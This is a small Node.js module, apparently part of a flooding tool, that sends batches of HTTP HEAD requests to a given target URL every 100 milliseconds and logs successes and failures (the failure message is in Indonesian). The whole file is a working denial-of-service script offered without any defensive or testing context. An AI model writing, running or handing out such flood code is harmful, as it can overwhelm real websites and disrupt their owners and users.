const axios = require('axios');
const chalk = require('chalk');

module.exports = function(target, threads) {
  setInterval(() => {
    for (let i = 0; i < threads; i++) {
      axios.head(target)
        .then(() => console.log(chalk.blue(`[✓] HEAD => ${target}`)))
        .catch(() => console.log(chalk.red(`[x] HEAD gagal`)));
    }
  }, 100);
};